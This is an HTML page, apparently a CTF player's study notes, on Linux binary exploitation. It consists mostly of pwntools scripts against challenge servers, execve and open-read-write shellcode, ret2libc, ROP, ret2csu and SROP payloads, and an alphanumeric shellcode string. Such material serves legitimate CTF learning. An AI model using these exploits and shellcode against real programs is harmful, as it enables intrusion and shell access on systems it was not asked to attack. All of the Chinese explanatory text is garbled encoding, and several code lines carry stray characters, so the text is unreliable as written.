<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">`from pwn import*`</span><br><span class="line">`context(log_level=&#x27;debug&#x27;)`</span><br><span class="line">`#p=process(&#x27;./1&#x27;)`</span><br><span class="line">`p=remote(&#x27;node5.buuoj.cn&#x27;,27540)`</span><br><span class="line">`system=0x8048400`</span><br><span class="line">`leave_ret=0x08048562`</span><br><span class="line">`payload=b&#x27;a&#x27;*0x27+b&#x27;b&#x27;</span><br><span class="line">p.sendafter(b&#x27;your name?&#x27;,payload)</span><br><span class="line">p.recvuntil(b&#x27;b&#x27;)</span><br><span class="line">ebp=u32(p.recv(4))</span><br><span class="line">print(ebp)</span><br><span class="line">print(hex(ebp))</span><br><span class="line">payload=b&#x27;a&#x27;*4+p32(system)+p32(0xdeadbeef)+p32(ebp-0x28)+b&#x27;/bin/sh&#x27;`</span><br><span class="line">`payload=payload.ljust(0x28,b&#x27;\x00&#x27;)`</span><br><span class="line">`payload+=p32(ebp-0x38)+p32(leave_ret)`</span><br><span class="line">`p.send(payload)`</span><br><span class="line">`p.interactive()`</span><br></pre></td></tr></table></figure>

<h2 id="orwæ²™ç›’"><a href="#orwæ²™ç›’" class="headerlink" title="orwæ²™ç›’"></a>orwæ²™ç›’</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ£€éªŒï¼šseccomp-tools dump ./æ–‡ä»¶å</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 32ä½ä¼ å‚é¡ºåºï¼šebx,ecx,edx,esi,<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=edi&spm=1001.2101.3001.7020">edi</a>,ebp<br>64ä½ä½¿ç”¨å¯„å­˜å™¨ä¼ å‚ï¼Œåˆ†åˆ«ç”¨rdi,rsi,rdx,rcx,r8,r9ä½œä¸ºç¬¬1-6ä¸ªå‚æ•°ã€‚raxä½œä¸ºè¿”å›å€¼ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#sys_open(&#x27;flag&#x27;,0,0)</span><br><span class="line">push 0x0 #å­—ç¬¦ä¸²æˆªæ–­</span><br><span class="line">push 0x67616c66 #å°ç«¯åºï¼Œè¾“å…¥galf</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">mov eax,0x5 #opençš„ç³»ç»Ÿè°ƒç”¨å·æ˜¯5</span><br><span class="line">int 0x80 #ä¸­æ–­è°ƒç”¨</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#sys_read(fd,buf,0x30)ç”¨åˆ°äº†ebx,ecx,edx</span><br><span class="line">mov eax,3</span><br><span class="line">mov ebx,3 #3æ˜¯openå‡½æ•°æ‰“å¼€å…¶ä»–æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œ0 1 2 3 æ˜¯æ ‡å‡†è¾“å…¥ï¼Œæ ‡å‡†è¾“å‡ºï¼Œå‡ºé”™ï¼Œå…¶ä»–æ–‡ä»¶</span><br><span class="line">mov ecx,esp</span><br><span class="line">mov edx,0x100</span><br><span class="line">int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#sys_write(1,file,0x30)</span><br><span class="line">mov eax,0x4</span><br><span class="line">mov ebx,0x1#ecxçš„å†…å®¹ä¸å˜</span><br><span class="line">mov edx,0x30</span><br><span class="line">int 0x80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./orw&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">shellcode = asm(&#x27;push 0x0;push 0x67616c66;mov eax,5;mov ebx,esp;xor ecx,ecx;xor edx,edx;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov eax,0x3;mov ecx,esp;mov ebx,0x3;mov edx,0x100;int 0x80&#x27;)</span><br><span class="line">shellcode+=asm(&#x27;mov ebx,1;mov eax,0x4;mov edx,0x50;int 0x80&#x27;)</span><br><span class="line">io.sendafter(&#x27;shellcode:&#x27;,shellcode)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io = process(&#x27;./orw&#x27;)</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">shellcode = shellcraft.open(&#x27;flag&#x27;)</span><br><span class="line">shellcode+=shellcraft.read(&#x27;eax&#x27;,&#x27;esp&#x27;,0x100)</span><br><span class="line">shellcode+=shellcraft.write(1,&#x27;esp&#x27;,0x100)</span><br><span class="line">payload = asm(shellcode)</span><br><span class="line">io.sendlineafter(&#x27;shellcode:&#x27;,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®æ¥æºï¼špwnable_orw 1</p>
<h2 id="æ ˆæº¢å‡º"><a href="#æ ˆæº¢å‡º" class="headerlink" title="æ ˆæº¢å‡º"></a>æ ˆæº¢å‡º</h2><h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>ASLR å…±äº«libcï¼Œå †ï¼Œå’Œæ ˆçš„åœ°å€è¿›è¡ŒéšæœºåŒ– <img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751899240452.png" alt="1751899240452"></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1751899371242.png" alt="1751899371242"></p>
<p>bin_sh&#x3D;base+next(libc.search(bâ€&#x2F;bin&#x2F;shâ€))!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p>
<p>system(â€œshâ€)&#x3D;system(â€œ&#x2F;bin&#x2F;shâ€)</p>
<p><strong>1.ASLRï¼š</strong></p>
<p>æ³„éœ²putsç±»çš„ï¼Œ32ä½ï¼Œç›´æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`payload=b&#x27;a&#x27;*padding+p32(puts_plt)+p32(main_addr)+p32(puts_got)`,</span><br><span class="line">64ä½ï¼Œ`payload=b&#x27;a&#x27;*padding+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(system)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ³„éœ²writeç±»çš„ï¼Œ32ä½ï¼Œç›´æ¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`payload=b&#x27;a&#x27;*padding+p32(write_plt)+p32(system)+p32(1)+p32(write_got)+p32(4)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>64ä½</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`payload=b&#x27;a&#x27;*padding+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_ret)+p64(write_got)+p64(pop_rdx_ret)+p64(8)`</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…¸ä¸­å…¸ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">`from pwn import *`</span><br><span class="line">`from LibcSearcher import LibcSearcher`</span><br><span class="line">`r=remote(&quot;node5.buuoj.cn&quot;,27696)`</span><br><span class="line"></span><br><span class="line">`elf=ELF(r&quot;C:\Users\lezho\Desktop\misc\bjdctf_2020_babyrop&quot;)`</span><br><span class="line">`puts_plt=elf.plt[&quot;puts&quot;]`</span><br><span class="line">`puts_got=elf.got[&quot;puts&quot;]`</span><br><span class="line">`main_addr=0x04006AD`</span><br><span class="line">`pop_rdi_ret=0x0400733`</span><br><span class="line">`ret=0x04004c9`</span><br><span class="line">`r.recvuntil(b&#x27;story!\n&#x27;)`</span><br><span class="line">`payload=b&#x27;a&#x27;*(0x20+8)+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">puts_addr=u64(r.recvuntil(&#x27;\n&#x27;,True).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&quot;puts&quot;)</span><br><span class="line">system=libc.dump(&quot;system&quot;)+offset</span><br><span class="line">binsh=libc.dump(&quot;str_bin_sh&quot;)+offset</span><br><span class="line">r.recvuntil(b&#x27;story!\n&#x27;)</span><br><span class="line">payload1=b&#x27;a&#x27;*(0x20+8)+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)`</span><br><span class="line">`r.sendline(payload1)`</span><br><span class="line">`r.interactive()`</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id=""><a href="#" class="headerlink" title="!!!"></a>!!!</h4><p><strong>1 scanfè¯»å…¥â€œ+ï¼Œ-â€å¥½ä¹‹ç±»çš„ä¸ä¼šå†™å…¥å†…å­˜</strong></p>
<p><strong>2 æ³¨æ„è¯»å…¥çš„æ•°æ˜¯unsignedè¿˜æ˜¯signed</strong></p>
<p><strong>3  64ä½shellcodeéœ€è¦æ ‡ä½ç¯å¢ƒ context.arch &#x3D; â€œamd64â€ ï¼Œæ²¡æœ‰çš„è¯å°±é»˜è®¤32ä½</strong> </p>
<p><strong>4 è‹¥å­˜åœ¨åé—¨å‡½æ•°ä¸”æº¢å‡ºçš„å­—ç¬¦ä¸å¤Ÿï¼Œå¯ä»¥åªæ”¹å˜éƒ¨åˆ†çš„è¿”å›å€¼ï¼Œå¦‚p8(0x88)å°±æ˜¯å°†è¿”å›åœ°å€çš„ä½8ä½æ”¹ä¸º\x88</strong></p>
<p><strong>5 å¦‚æœé¢˜ç›®æ˜¯v&#x3D;&#x3D;0.1è§¦å‘shellï¼Œä¸”å…¶åœ¨æˆ‘ä»¬è¦è¦†ç›–çš„ä¸œè¥¿èŒƒå›´ä¹‹å†…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å°†è¯¥å€¼è½¬ä¸º0.1çš„64ä½0x3FB999999999999Aï¼Œå³p64(0x3FB999999999999A),readé€šå¸¸è¦è½¬ä¸º64ä½or32ä½ï¼Œscanf(â€œ%s or %dâ€,v)â€“p32&#x2F;p64ï¼Œscanf(â€œ%fâ€,v)â€“(bâ€™0.1â€™)</strong></p>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>32ä½ä¸å¼ºåˆ¶è¦æ ‡æ˜ï¼Œ64ä½è¦ã€‚</p>
<p>è‹¥è¦ç»•è¿‡æŸäº›æ£€æŸ¥åæ‰§è¡Œshellcode,å¯åœ¨å‰é¢åŠ ä¸Šâ€\x00b\x22â€è¿™æ ·å¯ä»¥ç»•è¿‡ï¼Œä¸ºä»€ä¹ˆè¦åŠ ä¸Š\x22ï¼Œä¸ºäº†é˜²æ­¢shellcodeæ²¡æœ‰å¯¹é½è¢«é”™è¯¯è§£æï¼Œè¿˜æœ‰ä¸€ä¸ªåŸå› æ˜¯è¿™ä¸ªæ±‡ç¼–æŒ‡ä»¤ä¸ä¼šæ”¹å˜å¯„å­˜å™¨çš„å€¼</p>
<p>æ‰‹æ“32ä½ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode =&#x27;&#x27;&#x27;</span><br><span class="line">xor eax,eax             #eaxç½®0</span><br><span class="line">xor edx,edx				#edxç½®0</span><br><span class="line">push edx				#å°†0å…¥æ ˆï¼Œæ ‡è®°äº†â€/bin/shâ€çš„ç»“å°¾</span><br><span class="line">push 0x68732f2f         #ä¼ é€’â€/shâ€ï¼Œä¸ºäº†4å­—èŠ‚å¯¹é½ï¼Œä½¿ç”¨//shï¼Œè¿™åœ¨execve()ä¸­ç­‰åŒäº/sh</span><br><span class="line">push 0x6e69622f         #ä¼ é€’â€œ/binâ€</span><br><span class="line">mov ebx,esp             #æ­¤æ—¶espæŒ‡å‘äº†â€/bin/shâ€,é€šè¿‡espå°†è¯¥å­—ç¬¦ä¸²çš„å€¼ä¼ é€’ç»™ebx</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0xB              #eaxç½®ä¸ºexecveå‡½æ•°çš„ä¸­æ–­å·</span><br><span class="line">int 0x80                #è°ƒç”¨è½¯ä¸­æ–­</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode=asmï¼ˆshellcodeï¼‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">shellcode_s =&#x27;&#x27;&#x27;</span><br><span class="line">xor eax,eax</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f </span><br><span class="line">mov ebx,esp</span><br><span class="line">xor ecx,ecx</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode_s = asm(shellcode_s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp esp//ä½¿ç¨‹åºè·³è½¬åˆ°espæ‰€æŒ‡å‘çš„ä½ç½®ï¼Œç®€å•è¯´å°±æ˜¯p32(jmp esp)+asm(è‡ªåˆ›æ±‡ç¼–)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é€†åºè¾“å‡ºshellcodeï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.sh())[::-1]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>amd64, linuxå¯è§å­—ç¬¦shellcode ä¸ºâ€™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>ä¾‹å­ï¼šbuu ciscn_2019_s_9 1</p>
<h4 id="ropchain"><a href="#ropchain" class="headerlink" title="ropchain"></a>ropchain</h4><p>ROPgadget â€“binary æ–‡ä»¶å â€“ropchain</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">funcaddï¼ˆè°ƒç”¨åœ°å€ï¼‰+retaddï¼ˆè¿”å›åœ°å€ï¼‰+agrsaddï¼ˆè°ƒç”¨å‚æ•°åœ°å€ï¼‰</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="ä¸­çº§rop"><a href="#ä¸­çº§rop" class="headerlink" title="ä¸­çº§rop"></a>ä¸­çº§rop</h4><p>å‰æå›é¡¾ï¼š</p>
<p>*<em>writeè§¦å‘ï¼š write(int fd, const void <em>buf, size_t count) rdi&#x3D;1ï¼Œrdx&#x3D;8,rsi&#x3D;æ³„éœ²åœ°å€;</em></em></p>
<p><img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/1754300051542.png" alt="1754300051542"></p>
<p>32ä½writeè¾“å‡ºçš„ä½ç½®åœ¨espå¼€å§‹</p>
<p>*<em>readè§¦å‘æ¡ä»¶ï¼š read(int fd, void <em>buf, size_t count) ï¼Œrdi&#x3D;0,rsi&#x3D;bufåœ°å€,rdx&#x3D;è¯»å…¥å­—èŠ‚çš„å¤§å°ï¼Œå³sizeï¼Œè¿˜æœ‰raxå­˜æ”¾å…¶ç³»ç»Ÿè°ƒç”¨å·â€”â€”0ï¼Œripå­˜æ”¾readå‡½æ•°åœ°å€ã€‚</em></em></p>
<p><strong>syscall32ä½ï¼šeax&#x3D;0xb,ebx&#x3D;â€&#x2F;bin&#x2F;sh\x00â€,ecx&#x3D;0,rdx&#x3D;0,int 0x8åœ°å€</strong></p>
<p><strong>execve64ä½ï¼šrax&#x3D;0x3bï¼Œrdi&#x3D;â€œ&#x2F;bin&#x2F;sh\x00â€</strong></p>
<p><strong>ç³»ç»Ÿè°ƒç”¨æŸ¥æ‰¾64ä½ï¼š  <a target="_blank" rel="noopener" href="https://syscalls64.paolostivanin.com/">Linux Syscall64 Reference</a> ï¼›32ä½ï¼š  <a target="_blank" rel="noopener" href="https://syscalls.kernelgrok.com/">Linux Syscall Reference</a></strong> </p>
<p> <img src="/linux%E7%94%A8%E6%88%B7%E5%B1%82pwn/2283ae92735aa4ec2a447469c1fa28c7.png" alt="img"> </p>
<p><strong>é•¿å¥è§£é‡Š</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;a&#x27;*(0x1C+4) + p32(read_plt) + p32(pop_3) + p32(0) + p32(bss) + p32(0x9) + p32(pop_eax) + p32(eax) + p32(pop_3) + p32(0) + p32(0) + p32(bss) + p32(int_80) </span><br><span class="line">io.recvuntil(b&quot;Your input :&quot;)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.sendline(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…ˆæŠŠæ ˆå¸ƒå±€å¥½ï¼Œç„¶åä¼šè·³è½¬åˆ°readå¤„ï¼Œåˆå› ä¸ºæ ˆå¸ƒå±€åˆ°int_80ï¼Œæ‰€ä»¥è¾“å…¥çš„â€&#x2F;bin&#x2F;sh\x00â€ä¸ºreadçš„å‚æ•°</p>
<p>ç¬¬ä¸€ä¸ªpop_3ç¬¬ä¸€ç§è§£é‡Šæ˜¯å°†ä¸‰ä¸ªå‚æ•°å¯¼å‡ºï¼Œç¬¬äºŒç§è§£é‡Šå°±æ˜¯ç›¸å¯¹åº”çš„æ”¹é€ å…¶rdiï¼Œrsiï¼Œrdx</p>
<p><strong>ret2csu</strong><br>$$<br>.text:00000000004005C0 ; void _libc_csu_init(void)<br>.text:00000000004005C0                 public libc_csu_init<br>.text:00000000004005C0 libc_csu_init proc near               ; DATA XREF: _start+16o<br>.text:00000000004005C0                 push    r15<br>.text:00000000004005C2                 push    r14<br>.text:00000000004005C4                 mov     r15d, edi<br>.text:00000000004005C7                 push    r13<br>.text:00000000004005C9                 push    r12<br>.text:00000000004005CB                 lea     r12, frame_dummy_init_array_entry<br>.text:00000000004005D2                 push    rbp<br>.text:00000000004005D3                 lea     rbp, do_global_dtors_aux_fini_array_entry<br>.text:00000000004005DA                 push    rbx<br>.text:00000000004005DB                 mov     r14, rsi<br>.text:00000000004005DE                 mov     r13, rdx<br>.text:00000000004005E1                 sub     rbp, r12<br>.text:00000000004005E4                 sub     rsp, 8<br>.text:00000000004005E8                 sar     rbp, 3<br>.text:00000000004005EC                 call    _init_proc<br>.text:00000000004005F1                 test    rbp, rbp<br>.text:00000000004005F4                 jz      short loc_400616<br>.text:00000000004005F6                 xor     ebx, ebx<br>.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]<br>.text:0000000000400600<br>.text:0000000000400600 loc_400600:                             ; CODE XREF: libc_csu_init+54j<br>.text:0000000000400600                 mov     rdx, r13<br>.text:0000000000400603                 mov     rsi, r14<br>.text:0000000000400606                 mov     edi, r15d<br>.text:0000000000400609                 call    qword ptr [r12+rbx*8]<br>.text:000000000040060D                 add     rbx, 1<br>.text:0000000000400611                 cmp     rbx, rbp<br>.text:0000000000400614                 jnz     short loc_400600<br>.text:0000000000400616<br>.text:0000000000400616 loc_400616:                             ; CODE XREF: libc_csu_init+34j<br>.text:0000000000400616                 add     rsp, 8<br>.text:000000000040061A                 pop     rbx<br>.text:000000000040061B                 pop     rbp<br>.text:000000000040061C                 pop     r12<br>.text:000000000040061E                 pop     r13<br>.text:0000000000400620                 pop     r14<br>.text:0000000000400622                 pop     r15<br>.text:0000000000400624                 retn<br>.text:0000000000400624 __libc_csu_init endp<br>$$<br>**</p>
<p>å¯å‘ç°ï¼Œè°ƒç”¨rdi,rsi,rdxçš„å¯„å­˜å™¨ä¸º0x400600,è€Œé—´æ¥è°ƒç”¨çš„æ˜¯0x40061Aï¼Œå› æ­¤é€šè¿‡èµ‹å€¼ç»™å…¶ä»–å¯„å­˜å™¨åä¼šé—´æ¥æ”¹å˜éœ€è¦çš„å¯„å­˜å™¨çš„å€¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):    </span><br><span class="line"># pop rbx,rbp,r12,r13,r14,r15    </span><br><span class="line"># rbx should be 0,    </span><br><span class="line"># rbp should be 1,enable not to jump   </span><br><span class="line"># r12 should be the function we want to callï¼Œè¦ç”¨åœ¨gotè¡¨ä¸­çš„åœ°å€    </span><br><span class="line"># rdi=edi=r15d    </span><br><span class="line"># rsi=r14    </span><br><span class="line"># rdx=r13    </span><br><span class="line"># lastä¸ºè¿”å›åœ°å€</span><br><span class="line"># 0x38æŒ‡çš„æ˜¯ä¸¤ä¸ªcsuä½¿ç”¨é—´çš„è·ç¦»ï¼Œå³p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)+1=0x38</span><br><span class="line">payload = &#x27;a&#x27; * 0x80 + b&#x27;a&#x27;*8    </span><br><span class="line">payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)    </span><br><span class="line">payload += p64(csu_front_addr)    </span><br><span class="line">payload += &#x27;a&#x27; * 0x38    </span><br><span class="line">payload += p64(last)    </span><br><span class="line">sh.send(payload)    </span><br><span class="line">sleep(1) </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>writeè°ƒç”¨ï¼š csu(0, 1, write_got, 8, write_got, 1, main_addr) </p>
<p>readè°ƒç”¨ï¼š csu(0, 1, read_got, 16, bss_base, 0, main_addr) ï¼Œç„¶åæ‰§è¡Œçš„å°±æ˜¯readåŠŸèƒ½ï¼Œæ‰€ä»¥å‘é€ sh.send(p64(execve_addr) + â€˜&#x2F;bin&#x2F;sh\x00â€™) </p>
<p>  execve(bss_base+8) ï¼šcsu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) </p>
<h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>å¯„å­˜å™¨è®¾ç½®</p>
<ol>
<li>raxï¼šç³»ç»Ÿè°ƒç”¨å·ï¼ˆä¾‹å¦‚0è¡¨ç¤ºreadï¼Œ0x3bè¡¨ç¤ºexecveï¼‰</li>
<li>rdiï¼šç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆæ–‡ä»¶æè¿°ç¬¦ã€æ–‡ä»¶åæŒ‡é’ˆç­‰ï¼‰</li>
<li>rsiï¼šç¬¬äºŒä¸ªå‚æ•°ï¼ˆç¼“å†²åŒºåœ°å€ã€argvç­‰ï¼‰</li>
<li>rdxï¼šç¬¬ä¸‰ä¸ªå‚æ•°ï¼ˆé•¿åº¦ã€envpç­‰ï¼‰</li>
<li>ripï¼šsigreturnåçš„æŒ‡ä»¤æŒ‡é’ˆï¼ˆé€šå¸¸æŒ‡å‘syscallï¼‰</li>
<li>rsp&#x2F;rbpï¼šå¦‚æœéœ€è¦æ§åˆ¶æ ˆæµï¼Œè®¾ç½®æ ˆæŒ‡é’ˆ</li>
</ol>
<p><strong>è®¾ç½®åŠŸèƒ½å‰ææ˜¯è¦æœ‰ä¸ªraxå°†å…¶è®¾ä¸ºâ€0xfâ€œä¸ºsigreturnç³»ç»Ÿè°ƒç”¨â€</strong></p>
<p><strong>è®¾ç½®readåŠŸèƒ½ï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0</span>          <span class="meta"># readç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">frame.rdi = <span class="number">0</span>          # æ–‡ä»¶æè¿°ç¬¦<span class="number">0</span>ï¼ˆ<span class="built_in">stdin</span>ï¼‰</span><br><span class="line">frame.rsi = <span class="number">0x402000</span>   # æ•°æ®å­˜å‚¨åœ°å€ï¼ˆæ•°æ®æ®µï¼‰</span><br><span class="line">frame.rdx = <span class="number">0x100</span>      # è¦è¯»å–çš„å­—èŠ‚æ•°</span><br><span class="line">frame.rip = <span class="number">0x401033</span>    <span class="meta"># sigreturnåçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</span></span><br><span class="line">frame.rbp = <span class="number">0x402000</span> + <span class="number">0x20</span>  # æ ˆæŒ‡é’ˆè®¾ç½®</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>è®¾ç½®execveåŠŸèƒ½ï¼š</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span>       <span class="meta"># execveç³»ç»Ÿè°ƒç”¨å·</span></span><br><span class="line">frame.rdi = <span class="number">0x402000</span>   # æŒ‡å‘<span class="string">&quot;/bin/sh&quot;</span>å­—ç¬¦ä¸²çš„æŒ‡é’ˆ</span><br><span class="line">frame.rsi = <span class="number">0x0</span>        <span class="meta"># argv = NULL</span></span><br><span class="line">frame.rdx = <span class="number">0x0</span>        <span class="meta"># envp = NULL</span></span><br><span class="line">frame.rip = <span class="number">0x401033</span>   <span class="meta"># syscallæŒ‡ä»¤åœ°å€</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>





